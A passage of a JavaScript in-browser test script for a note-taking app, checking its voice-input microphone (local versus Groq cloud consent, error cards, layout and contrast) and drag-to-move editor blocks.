      const pill = app.querySelector('.avx-pill'); V.pill = txt(pill);
      if (!pill || app.querySelector('.avx-live') || !pill.querySelector('.vpill-dot') || txt(pill.querySelector('[data-avx-time]')) !== '0:25' || txt(pill.querySelector('[data-act="avx-stop"]')) !== 'Stop' || !pill.querySelector('[data-act="avx-discard"]')?.dataset.tip) bad('a long question: the pill with the clock, the words, Stop and Discard', V.pill);
      measure('R69 pill');
      pill.querySelector('[data-act="avx-discard"]').click(); await until(() => AVX.stage === 'idle'); await tick(3);
      if (sent(calls).length || app.querySelector('.avx-pill') || !calls.filter(c => c[0] === 'ask_voice_discard').length) bad('Discard keeps nothing', '');
      // while it turns the words into text the box says so
      E.stage = 'idle'; E.secs = 3; await listen(); E.held = true; mic().click(); await until(() => AVX.stage === 'transcribing'); await tick(6);
      V.transcribing = txt(app.querySelector('.avx-live'));
      if (V.transcribing !== 'Turning what you said into text on this PC…' || mic().getAttribute('aria-disabled') !== 'true') bad('turning words into text: the line and the mic waiting', V.transcribing);
      E.held = false; await until(() => sent(calls).length === 1); });
    // 6 · The Agent and the floating window have the same mic, and the words go to what asks (aicAsk)
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {};
    { let got = null; agtAsk = (n, q) => { got = q; };   // eslint-disable-line no-global-assign
      AGT.on = true; AIC.scope = 'agent'; renderAll();
      await withApi(fake(), async calls => {
        await open(); const hello = app.querySelector('.agt-hello, .agt-note');
        if (!mic() || !app.querySelector('.agt-about')) bad('the Agent has the mic too', `mic ${!!mic()} · agent ${!!app.querySelector('.agt-about')}`);
        E.secs = 2; await listen(); mic().click(); await until(() => got !== null);
        V.agent = `"${got}" · ai_ask ${sent(calls).length}`;
        if (got !== E.text || sent(calls).length) bad('the Agent gets the spoken request (not Ask)', V.agent); });
      agtAsk = keep.ask; AGT.on = keep.agt.on; AGT.tools = keep.agt.tools; AIC.scope = 'note'; }   // eslint-disable-line no-global-assign
    // the floating window is the chat's own window in the app (aicPopCard): it draws the same input, so the same mic
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; AIC.open = true; AIC.mode = 'dock'; AIC.scope = 'note'; renderAll();
    await withApi(fake(), async calls => {
      await open(); const ra0 = renderAll; renderAll = function () { app.innerHTML = aicPopCard(); };   // eslint-disable-line no-global-assign
      try { renderAll(); AVX.noteId = note().id;
      const win = app.querySelector('.aic-win--pop');
      if (!win || !win.querySelector('.avx-mic') || !win.querySelector('.avx-hint')) bad('the chat’s own window has the mic and the hint', `win ${!!win} mic ${!!win?.querySelector('.avx-mic')}`);
      E.secs = 2; mic().click(); await until(() => AVX.stage === 'listening'); mic().click(); await until(() => sent(calls).length === 1);
      if (sent(calls)[0] !== E.text) bad('the chat’s own window sends the spoken words', sent(calls)[0]);
      // its first-use question is a card inside it (that window draws no dialogs)
      await until(() => !AIC.busy); E.stage = 'idle'; E.seen = false; AVX.where = 'cloud'; E.start = () => AVX.where === 'cloud' && !E.seen ? { status: 'error', code: 'first', message: 'x' } : okStart();
      mic().click(); await until(() => AVX.note?.kind === 'first'); await tick(2);
      const fc = app.querySelector('[data-avx-note="first"]'); V.popFirst = txt(fc);
      if (S.modal === 'avx-first' || AVX.first) bad('the chat’s own window asks with a card, not a dialog', `${S.modal}`);
      key('keydown', { key: 'Escape' }, document); await tick(3);
      if (AVX.note || calls.some(c => c[0] === 'ask_voice_cloud_yes')) bad('Esc on the card sends nothing', `${AVX.note?.kind}`);
      E.start = okStart; AVX.where = 'pc'; } finally { renderAll = ra0; } });   // eslint-disable-line no-global-assign
    AIC.open = false; renderAll();
    // 7 · The cloud: the first time asks (nothing recorded, nothing sent), Use Groq / Keep it on this PC / close
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; AVX.where = 'cloud'; E.start = () => AVX.where === 'cloud' && !E.seen ? { status: 'error', code: 'first', message: 'Nothing was recorded: say yes to Groq hearing you first.' } : okStart();
    renderAll();
    await withApi(fake(), async calls => {
      await open(); mic().click(); await until(() => S.modal === 'avx-first'); await tick();
      const d = app.querySelector('[data-dlg="avx-first"]'); V.first = `${txt(d?.querySelector('.modal-title'))} · ${txt(d?.querySelector('.modal-body'))} · ${[...(d?.querySelectorAll('.modal-foot .btn') || [])].map(b => txt(b)).join(' | ')}`;
      if (!d || txt(d.querySelector('.modal-title')) !== 'Let Groq hear what you say?' || !/Whisper large-v3/.test(txt(d)) || !/Or keep it on this PC: base\.en, slower, and nothing you say leaves it\./.test(txt(d)) || [...d.querySelectorAll('.modal-foot .btn')].map(b => txt(b)).join('|') !== 'Keep it on this PC|Use Groq' || d.querySelector('.modal-x')?.getAttribute('aria-label') !== 'Close: nothing is sent') bad('the first-use question: the title, what leaves the PC, Keep it on this PC then Use Groq', V.first);
      if (E.stage !== 'idle' || calls.some(c => c[0] === 'ask_voice_cloud_yes')) bad('nothing is recorded or agreed before the yes', JSON.stringify(calls.map(c => c[0])));
      measure('R69 first-use');
      key('keydown', { key: 'Escape' }); await tick(4);
      if (S.modal || calls.some(c => c[0] === 'ask_voice_cloud_yes') || AVX.stage !== 'idle') bad('Esc closes it: nothing is sent', `${S.modal} ${AVX.stage}`);
      mic().click(); await until(() => S.modal === 'avx-first'); app.querySelector('[data-act="avx-fyes"]').click(); await until(() => AVX.stage === 'listening');
      const yes = calls.filter(c => ['ask_voice_cloud_yes', 'ask_voice_start'].includes(c[0])).map(c => c[0]).slice(-3).join(' > ');
      V.useGroq = `${yes} · ${txt(app.querySelector('.avx-hint'))}`;
      if (!/^ask_voice_start > ask_voice_cloud_yes > ask_voice_start$/.test(yes) || calls.find(c => c[0] === 'ask_voice_cloud_yes')[1][0] !== true || txt(app.querySelector('.avx-hint')) !== 'Tap the mic again to finish. Heard by Groq (Whisper large-v3) · your recording goes to Groq') bad('Use Groq: the yes is saved, then it listens, and says Groq hears it', V.useGroq);
      mic().click(); await until(() => sent(calls).length === 1); await until(() => !AIC.busy); E.stage = 'idle';
      // asked once: the next tap listens at once
      const asks = calls.filter(c => c[0] === 'ask_voice_cloud_yes').length; mic().click(); await until(() => AVX.stage === 'listening'); if (S.modal || calls.filter(c => c[0] === 'ask_voice_cloud_yes').length !== asks) bad('after the yes it does not ask again', S.modal);
      key('keydown', { key: 'Escape' }, app.querySelector('#aic-in')); await until(() => AVX.stage === 'idle');
      // Keep it on this PC: the setting goes back and it listens on this PC
      E.seen = false; AVX.where = 'cloud'; renderAll(); mic().click(); await until(() => S.modal === 'avx-first'); app.querySelector('[data-act="avx-fkeep"]').click(); await until(() => AVX.stage === 'listening');
      const save = calls.filter(c => c[0] === 'save_settings').map(c => JSON.stringify(c[1][0])).pop();
      V.keepPc = `${save} · ${AVX.where} · ${txt(app.querySelector('.avx-hint'))}`;
      if (!/"ask_voice_where":"pc"/.test(save) || AVX.where !== 'pc' || !/Heard on this PC \(base\.en\)/.test(txt(app.querySelector('.avx-hint')))) bad('Keep it on this PC: the setting goes back, and it listens', V.keepPc);
      key('keydown', { key: 'Escape' }, app.querySelector('#aic-in')); await until(() => AVX.stage === 'idle');
      // the close button: nothing happens
      E.seen = false; AVX.where = 'cloud'; renderAll(); mic().click(); await until(() => S.modal === 'avx-first'); app.querySelector('.modal-x').click(); await tick(4);
      if (S.modal || AVX.stage !== 'idle' || E.stage !== 'idle') bad('the × closes the question and sends nothing', `${S.modal} ${AVX.stage}`); });
    // 8 · The cards: no microphone, no speech model (download it here), no cloud key
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; renderAll();
    await withApi(fake({ open_mic_settings: () => ({ status: 'success' }) }), async calls => {
      await open(); E.start = () => ({ status: 'error', code: 'nomic', message: 'No microphone found.' });
      mic().click(); await until(() => AVX.note?.kind === 'nomic'); await tick(3);
      const nm = app.querySelector('[data-avx-note="nomic"]'); V.nomic = `${txt(nm)} · mic ${mic().getAttribute('aria-label')}`;
      if (txt(nm) !== 'NeuroVault can’t hear you No microphone was found, or Windows has the microphone turned off for apps. You can still type. Microphone settings' || nm.getAttribute('role') !== 'alert' || mic().getAttribute('aria-disabled') !== 'true' || mic().getAttribute('aria-label') !== 'No microphone') bad('no microphone: the card, the way to Windows’ settings, the mic greyed with its reason', V.nomic);
      if (app.querySelector('.avx-hint')) bad('a card replaces the idle hint', '');
      measure('R69 no microphone');
      nm.querySelector('[data-act="avx-micset"]').click(); await tick(3); if (!calls.some(c => c[0] === 'open_mic_settings')) bad('Microphone settings opens Windows’ page', '');
      // no speech model: the size, the same-model line, Download, and Keep typing
      AVX.note = null; AVX.info = null; E.present = false; E.start = () => ({ status: 'error', code: 'nomodel', message: 'Speaking needs the speech model.' }); renderAll(); await until(() => AVX.info);
      mic().click(); await until(() => AVX.note?.kind === 'nomodel'); await tick(3);
      const mm = app.querySelector('[data-avx-note="nomodel"]'); V.nomodel = `${txt(mm)} · mic ${mic().getAttribute('aria-label')}`;
      if (txt(mm) !== 'Speaking needs the speech model base.en, 161 MB, runs on this PC: nothing you say leaves it. It’s the same model as the voice ramble. Download (161 MB) Keep typing' || mic().getAttribute('aria-label') !== 'Needs the speech model') bad('no speech model: the card with Download and Keep typing', V.nomodel);
      AVX.where = 'cloud'; renderAll(); if (!/Use Groq instead/.test(txt(app.querySelector('[data-avx-note="nomodel"]')))) bad('with the cloud chosen the card offers Use Groq instead', txt(app.querySelector('[data-avx-note]'))); AVX.where = 'pc'; renderAll();
      E.present = true; app.querySelector('[data-act="avx-dl"]').click(); await until(() => calls.some(c => c[0] === 'voice_download_model') && !AVX.note, 200);
      if (!calls.some(c => c[0] === 'voice_download_model') || AVX.note) bad('Download starts the speech model; the card goes when it is there', `${calls.some(c => c[0] === 'voice_download_model')} ${AVX.note?.kind}`);
      AVX.note = { kind: 'nomodel' }; renderAll(); app.querySelector('[data-act="avx-type"]').click(); await tick(3);
      if (AVX.note || document.activeElement?.id !== 'aic-in') bad('Keep typing closes the card and puts the caret in the box', `${AVX.note?.kind} ${document.activeElement?.id}`);
      // the cloud chosen with no key
      E.start = () => ({ status: 'error', code: 'nokey', message: 'There\'s no Groq key.' }); AVX.where = 'cloud'; renderAll(); mic().click(); await until(() => AVX.note?.kind === 'nokey'); await tick(3);
      V.nokey = txt(app.querySelector('[data-avx-note="nokey"]'));
      if (V.nokey !== 'Groq needs a key Add your Groq key in Settings → AI models to have it hear you. Nothing was recorded. AI models… Use this PC instead Keep typing') bad('no key: the card, AI models…, Use this PC instead', V.nokey);
      E.start = okStart; app.querySelector('[data-act="avx-usepc"]').click(); await until(() => AVX.stage === 'listening');
      if (AVX.where !== 'pc' || !calls.filter(c => c[0] === 'save_settings').some(c => c[1][0].ask_voice_where === 'pc')) bad('Use this PC instead saves the setting and listens', AVX.where);
      key('keydown', { key: 'Escape' }, app.querySelector('#aic-in')); await until(() => AVX.stage === 'idle');
      E.start = () => ({ status: 'error', code: 'nokey', message: 'x' }); AVX.where = 'cloud'; renderAll(); mic().click(); await until(() => AVX.note?.kind === 'nokey'); app.querySelector('[data-act="avx-ai"]').click(); await tick(3);
      if (S.modal !== 'settings' || S.setSec !== 'ai') bad('AI models… opens Settings → AI models', `${S.modal}/${S.setSec}`); set({ modal: null }); });
    // 9 · The listening state in the docked chat and in the chat's own window (at its smallest, 360 wide), at two screens and four fonts: the mic is the
    //     send button's size, and the mic, the live words and the hint stay inside the window and never run sideways
    resetAVX(); resetE(); AIC.chats = {}; AIC.drafts = {}; AIC.open = false;
    await withApi(fake(), async calls => {
      const ra0 = renderAll;
      try {
        for (const sc of ['1366x768', '1920x1080']) for (const [f] of FONTS) for (const mode of ['dock', 'pop']) {
          const k = `${sc}/${f}/${mode}`; renderAll = ra0; set({ screen: sc, font: f }); resetAVX(); resetE(); AIC.chats = {}; AIC.open = false; AIC.mode = 'dock'; AVX.start = 'hold'; renderAll(); await open();
          if (mode === 'pop') { renderAll = function () { app.innerHTML = aicPopCard(); const w = app.querySelector('.aic-win--pop'); if (w) Object.assign(w.style, { width: '360px', height: '420px' }); }; renderAll(); }   // eslint-disable-line no-global-assign
          AVX.noteId = note().id; E.secs = 3; E.heard = true; E.quiet = 0; E.words = 'what is left on the accessibility audit and who do I ask about the budget'; await listen(); await tick(3);
          const win = app.querySelector('[data-aic-win]'), m = mic(), s = app.querySelector('.aic-send'), row = app.querySelector('.aic-row'), hint = app.querySelector('.avx-hint'), live = app.querySelector('.avx-live');
          if (!win || !m || !s || !hint || !live) { bad('listening is drawn', `${k}: win ${!!win} mic ${!!m} send ${!!s} hint ${!!hint} live ${!!live}`); continue; }
          const wr = win.getBoundingClientRect(), out = [['mic', m], ['hint', hint], ['live words', live]].filter(([, el]) => { const b = el.getBoundingClientRect(); return b.left < wr.left - 1 || b.right > wr.right + 1 || b.top < wr.top - 1 || b.bottom > wr.bottom + 1; }).map(([n, el]) => `${n} ${[...Object.values(el.getBoundingClientRect().toJSON())].slice(0, 4).map(Math.round)} in ${[wr.left, wr.top, wr.right, wr.bottom].map(Math.round)}`);
          if (out.length) bad('the mic, the live words and the hint stay inside the window', `${k}: ${out.join('; ')}`);
          if (Math.abs(m.offsetHeight - s.offsetHeight) > 1 || Math.abs(m.offsetWidth - s.offsetWidth) > 1) bad('the mic is the send button’s size', `${k}: ${m.offsetWidth}×${m.offsetHeight} vs ${s.offsetWidth}×${s.offsetHeight}`);
          if (row.scrollWidth > row.clientWidth + 1) bad('the input row does not run sideways', `${k}: ${row.scrollWidth} > ${row.clientWidth}`);
          if (live.scrollWidth > live.clientWidth + 1 || hint.scrollWidth > hint.clientWidth + 1) bad('the live words and the hint wrap or cut, never run sideways', `${k}: ${live.scrollWidth}/${live.clientWidth} ${hint.scrollWidth}/${hint.clientWidth}`);
          measure('R69 ' + k);
          key('keydown', { key: 'Escape' }, app.querySelector('#aic-in')); await until(() => AVX.stage === 'idle'); renderAll = ra0; AIC.open = false; renderAll(); }
      } finally { renderAll = ra0; } });   // eslint-disable-line no-global-assign
    // the mic on its danger fill is readable in every theme
    await withApi(fake(), async () => { let min = 99, at = ''; const lum = c => { const f = v => { v /= 255; return v <= .03928 ? v / 12.92 : ((v + .055) / 1.055) ** 2.4; }; return .2126 * f(c[0]) + .7152 * f(c[1]) + .0722 * f(c[2]); };
      for (const [th] of THEMES) { set({ screen: '1920x1080', theme: th, font: 'system' }); resetAVX(); AIC.chats = {}; AIC.open = false; AIC.mode = 'dock'; renderAll(); await open(); AVX.stage = 'listening'; renderAll();
        const m = mic(); if (!m) { bad('the mic is drawn in ' + th, ''); continue; } const cs = getComputedStyle(m), bg = cs.backgroundColor.match(/[\d.]+/g).map(Number), fg = cs.color.match(/[\d.]+/g).map(Number);
        const r = (Math.max(lum(bg), lum(fg)) + .05) / (Math.min(lum(bg), lum(fg)) + .05); if (r < min) { min = r; at = th; } AVX.stage = 'idle'; AIC.open = false; }
      V.contrast = `${min.toFixed(2)} (${at})`; if (min < 3) bad('the listening mic’s icon on its red fill (3:1 for an icon)', V.contrast); });
  } catch (e) { bad('check crashed', e.stack || e.message); }
  finally { avxClear(); resetAVX(); resetAIC(); resetE(); agtAsk = keep.ask; AGT.on = keep.agt.on; AGT.tools = keep.agt.tools; AI.st = keep.st; AI.demo = keep.demo; set({ screen: '1920x1080', theme: 'slate', font: 'system', view: 'notes', modal: null }); renderAll(); }   // eslint-disable-line no-global-assign
}
/* ==== end Build N · R69 ==== */
/* ==== QC 115 · drag a block from anywhere (feedback: "icon dissapears when I try to get to it so I cannot drag anything, ideally we should
   just drag from anywhere on the ui elements"). In a note with an attachment card, a code block, a table, a callout and a photo, at
   1920 × 1080 and 1366 × 768: the handle stays all the way from the block to itself (the pointer over the note's margin, not the block),
   leaves only after a short grace, and is reachable (nothing covers it); a card or photo is picked up by pressing anywhere on it and moving
   5 px (2 px does nothing); a code block and a callout by their frame; a table only by its grip; a click on Open stays a click; the click that
   ends a drag opens nothing; text in a paragraph, code block, callout and table keeps its own press (nothing prevented, nothing picked up).
   Runs in the full sweep, or alone with ?check=1&only=qc115 ==== */
async function checkQc115() {
  out.numbers.qc115 = {};
  const MARK = ['tags: [plan]', 'Intro line', 'budget.docx', 'const a = 1', '| Region', '[!note]', 'photo.png', 'Last line'];
  const MD = '---\ntags: [plan]\n---\nIntro line.\n\n![[attachments/budget.docx]]\n\n```js\nconst a = 1;\n```\n\n| Region | Spent |\n| --- | --- |\n| North | 12 |\n\n> [!note] Heads up\n> Body text.\n\n![[attachments/photo.png]]\n*A caption*\n\n<!-- nv-pins 24.0,30.0 -->\n\n1. Pin one\n\nLast line.\n';
  const doc = () => app.querySelector('.ed-pane > .doc[contenteditable="true"]'), order = s => MARK.map(m => [m, s.indexOf(m)]).sort((a, b) => a[1] - b[1]).map(x => MARK.indexOf(x[0])).join('');
  const lines = s => s.split('\n').filter(x => x.trim()).sort().join('\n');
  const PE = (type, x, y, o) => new PointerEvent(type, { clientX: x, clientY: y, button: 0, buttons: type === 'pointerup' ? 0 : 1, bubbles: true, cancelable: true, ...o });
  const mv = (x, y) => document.dispatchEvent(PE('pointermove', x, y)), hov = (el, x, y) => el.dispatchEvent(PE('pointermove', x, y, { buttons: 0 }));
  const handle = () => app.querySelector('.blk-layer [data-blk-handle]');
  let n = note();
  try {
    for (const scr of ['1920x1080', '1366x768']) {
      set({ screen: scr, sample: 'typical', view: 'notes', modal: null, side: true, inspector: 'shown', zen: 'off' }); S.mode = 'wysiwyg'; PH.mode = 'both'; n = note();
      const fresh = () => { n.md = MD; n.html = null; n.docDirty = false; EDH.delete(n.id); renderAll(); BLK.pick = BLK.hover = BLK.drag = BLK.pend = null; clearTimeout(BLK.leave); BLK.leave = 0; document.body.classList.remove('is-blk-drag'); return doc(); };
      const md = () => { n.docDirty = true; syncDoc(n); return n.md; };
      const K = (k, v) => iss('QC 115: ' + k, `${scr}: ${v}`), KIND = ['', 'attachment', 'code', 'table', 'callout', 'image', ''];
      let d = fresh(); const md0 = md(); out.combos++;

      // 1 · the handle stays all the way from the block to itself: the pointer travels over the note's margin (not the block), from the block's middle
      for (let i = 1; i <= 5; i++) {
        d = fresh(); const u = blkUnits(d)[i], b = blkRect(u), el = u.nodes.find(x => x.nodeType === 1);
        hov(el, b.left + 30, (b.top + b.bottom) / 2); const h = handle(); if (!h) { K(`the ${KIND[i]} shows its handle`, 'none'); continue; }
        const hr = h.getBoundingClientRect(), hx = (hr.left + hr.right) / 2, hy = (hr.top + hr.bottom) / 2, sx = b.left + 30, sy = (b.top + b.bottom) / 2, margin = d.parentElement;
        for (let s = 1; s <= 12; s++) { const x = sx + (hx - sx) * s / 12, y = sy + (hy - sy) * s / 12, inside = b.left <= x && x <= b.right && b.top <= y && y <= b.bottom;
          hov(inside ? el : s === 12 ? h : margin, x, y);
          if (!handle()) { K(`the ${KIND[i]}'s handle stays on the way to it`, `gone at step ${s} of 12, ${Math.round(x - b.left)},${Math.round(y - b.top)} from the block's corner`); break; } }
        const at = document.elementFromPoint(hx, hy); if (handle() && !at?.closest('[data-blk-handle]')) K(`the ${KIND[i]}'s handle can be reached (nothing covers it)`, at?.className || at?.nodeName);
        // off it, it waits a moment; away, it goes
        hov(document.body, 2, 2); if (!handle()) K(`the ${KIND[i]}'s handle waits a moment after the pointer leaves`, 'gone at once');
        await wait(450); if (handle()) K(`the ${KIND[i]}'s handle goes when the pointer is away`, 'still there after 450 ms');
        out.combos++;
      }
      d = fresh(); { const b = blkRect(blkUnits(d)[0]); hov(d.firstElementChild, b.left + 30, (b.top + b.bottom) / 2); if (handle()) K('a plain paragraph shows no handle', 'shown'); }

      // 2 · a card, a photo, a code block, a callout: picked up by pressing on the body and moving 5 px; the gap before the first block is the target
      const press = (u, pick, name, wantOrder, still) => {
        d = fresh(); const us = blkUnits(d), el = pick(us[u]); if (!el) { K(`${name}: found`, 'no element'); return; }
        const r = el.getBoundingClientRect(), top = blkRect(us[0]).top, x = r.left + Math.min(40, r.width / 2), y = r.top + Math.min(8, r.height / 2);
        const down = PE('pointerdown', x, y); el.dispatchEvent(down); if (down.defaultPrevented) K(`${name}: the press is not taken over`, 'preventDefault on the press');
        mv(x + 2, y + 1); if (BLK.drag || md() !== md0) K(`${name}: 2 px is not a drag`, 'moved');
        mv(x + 3, y + 5); mv(x, top - 6); if (still) { if (BLK.drag) K(`${name}: no drag from the body`, 'dragging'); } else if (!BLK.drag?.moved) K(`${name}: 5 px starts the drag`, 'no drag'); else if (!app.querySelector('.blk-layer .blk-drop')) K(`${name}: a drop line shows`, 'none');
        document.dispatchEvent(PE('pointerup', x, top - 6)); const m1 = md();
        if (order(m1) !== wantOrder) K(`${name}: dropped before the first block`, `order ${order(m1)}, wanted ${wantOrder}`);
        if (lines(m1) !== lines(md0)) K(`${name}: keeps every line`, m1.slice(0, 120));
        if (BLK.drag || BLK.pend || document.body.classList.contains('is-blk-drag')) K(`${name}: the drag ends`, 'still dragging');
        edUndo(doc()); if (md() !== md0) K(`${name}: Ctrl+Z puts it back`, order(md())); out.combos++;
      };
      press(1, un => un.nodes[0], 'a file card, from its body', '02134567');
      press(1, un => un.nodes[0].querySelector('button, a, [data-act]') || un.nodes[0], 'a file card, from its button', '02134567');
      press(5, un => un.nodes[0].querySelector('img') || un.nodes[0], 'a photo, from the picture', '06123457');
      press(2, un => un.nodes[0], 'a code block, from its frame', '03124567');
      press(4, un => un.nodes[0], 'a callout, from its frame', '05123467');
      press(3, un => un.nodes[0], 'a table, from its frame (a table moves by its grip)', '01234567', true);

      // 3 · a click stays a click: the card's button is not a drag, and the click that ends a drag opens nothing
      d = fresh(); { const card = blkUnits(d)[1].nodes[0]; let btn = card.querySelector('button, a, [data-act]');
        if (!btn) K('the file card has an Open button', card.outerHTML.slice(0, 120)); else { let clicks = 0; const f = () => clicks++; btn.addEventListener('click', f); const r = btn.getBoundingClientRect(), x = r.left + r.width / 2, y = r.top + r.height / 2; BLK.noClick = false;
          btn.dispatchEvent(PE('pointerdown', x, y)); mv(x + 1, y); document.dispatchEvent(PE('pointerup', x, y)); btn.dispatchEvent(new MouseEvent('click', { clientX: x, clientY: y, bubbles: true, cancelable: true }));
          if (clicks !== 1 || BLK.drag || md() !== md0) K('a plain click on the card\'s button still opens it', `${clicks} clicks, drag ${!!BLK.drag}`);
          btn.removeEventListener('click', f); d = fresh(); btn = blkUnits(d)[1].nodes[0].querySelector('button, a, [data-act]'); btn.addEventListener('click', f); BLK.noClick = false;   // the first click may have redrawn the note
          btn.dispatchEvent(PE('pointerdown', x, y)); mv(x + 10, y + 4); mv(x + 12, y + 30); document.dispatchEvent(PE('pointerup', x + 12, y + 30)); btn.dispatchEvent(new MouseEvent('click', { clientX: x, clientY: y, bubbles: true, cancelable: true }));
          if (clicks !== 1) K('the click that ends a drag is not an Open', `${clicks} clicks, drag ended ${!BLK.drag}`);
          btn.removeEventListener('click', f); BLK.noClick = false; } out.combos++; }

      // 4 · text keeps its press: nothing taken over, nothing picked up, nothing moved, a selection stays
      d = fresh(); for (const [name, el] of [['a paragraph', d.querySelector('p')], ['code', blkUnits(d)[2].nodes[0].querySelector('code')], ['a callout\'s text', blkUnits(d)[4].nodes[0].querySelector('p:not(.callout-title)') || blkUnits(d)[4].nodes[0].querySelector('p')], ['a table cell', blkUnits(d)[3].nodes[0].querySelector('td')]]) {
        if (!el) { K(`${name}: found`, 'no element'); continue; } const r = el.getBoundingClientRect(), x = r.left + 12, y = r.top + Math.min(8, r.height / 2), down = PE('pointerdown', x, y);
        el.dispatchEvent(down); mv(x + 6, y); mv(x + 40, y + 2); if (down.defaultPrevented || BLK.pend || BLK.drag || document.body.classList.contains('is-blk-drag')) K(`${name}: pressing and dragging in text selects text`, `prevented ${down.defaultPrevented}, pend ${!!BLK.pend}, drag ${!!BLK.drag}`);
        const t = document.createTreeWalker(el, NodeFilter.SHOW_TEXT).nextNode(); if (t && t.data.length > 3) { d.focus(); getSelection().setBaseAndExtent(t, 0, t, 3); }
        document.dispatchEvent(PE('pointerup', x + 40, y + 2)); if (t && t.data.length > 3 && getSelection().toString().length !== 3) K(`${name}: the selection stays`, `"${getSelection().toString()}"`);
        if (md() !== md0) K(`${name}: nothing moved`, order(md())); out.combos++; }
    }
  } finally { BLK.pick = BLK.hover = BLK.drag = BLK.pend = null; clearTimeout(BLK.leave); BLK.leave = 0; BLK.noClick = false; document.body.classList.remove('is-blk-drag'); EDH.delete(n.id); set({ screen: '1920x1080', sample: 'typical', modal: null }); }
}
run().then(show).catch(e => { out.summary = 'CHECK FAILED ' + e.stack; show(); });
})();

